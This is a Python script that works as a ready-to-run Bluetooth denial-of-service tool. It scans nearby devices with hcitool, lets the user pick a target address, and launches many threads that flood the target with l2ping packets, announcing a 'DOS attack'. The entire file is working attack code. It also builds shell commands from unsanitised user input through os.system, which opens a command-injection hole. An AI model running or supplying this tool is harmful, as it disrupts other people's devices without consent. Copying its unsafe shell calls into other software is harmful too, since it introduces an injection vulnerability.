import os
import threading
import time
import subprocess
import tempfile

def scan_filter(x):
	return len(x) > 0

def SCAN():
	output = os.popen('sudo hcitool scan').read()
	eachLine = output.split('\n')
	count = 0
	print('-')
	res = []
	for line in eachLine:
		data = list(filter(scan_filter, line.split('\t')))
		if (len(data) == 2):
			print(count, ' : ', data[0], '\t', data[1], '\n')
			count += 1
			res.append(data[0])
	print('-')
	return res

def DOS(target_addr, packages_size):
    os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)

def main():
    target_addr = ''
    action = input("SCANNING nearby devices or type specific ADDRESS ? (S/A) > ")
    if action in ['s', 'S']:
        targets = SCAN()
        
        if len(targets) <= 0:
            print('[!] ERROR: No devices.')
            exit(0)

        target_num = int(input('Target(Type the number of above targets) > '))

        if target_num < 0 or target_num >= len(targets):
            print('[!] ERROR: Out of range 0 ~ ', len(targets)-1)
            exit(0)
        else:
            target_addr = targets[target_num]
            
    elif action in ['a', 'A']:
    	target_addr = input('Target Address > ')

    try:
        packages_size = int(input('Packages size > '))
    except:
        print('[!] ERROR: Packages size must be an integer')
        exit(0)
    try:
        threads_count = int(input('Threads count > '))
    except:
        print('[!] ERROR: Threads count must be an integer')
        exit(0)
    print('')
    os.system('clear')

    print("[*] Starting DOS attack in 3 seconds...")

    for i in range(0, 3):
        print('[*] ' + str(3 - i))
        time.sleep(1)
    os.system('clear')
    print('[*] Building threads...\n')

    for i in range(0, threads_count):
        print('[*] Built thread №' + str(i + 1))
        threading.Thread(target=DOS, args=[str(target_addr), str(packages_size)]).start()

    print('[*] Built all threads...')
    print('[*] Starting...')

if __name__ == '__main__':
    try:
        os.system('clear')
        main()
    except KeyboardInterrupt:
        time.sleep(0.1)
        print('\n[*] Aborted')
        exit(0)
    except Exception as e:
        time.sleep(0.1)
        print('[!] ERROR: ' + str(e))
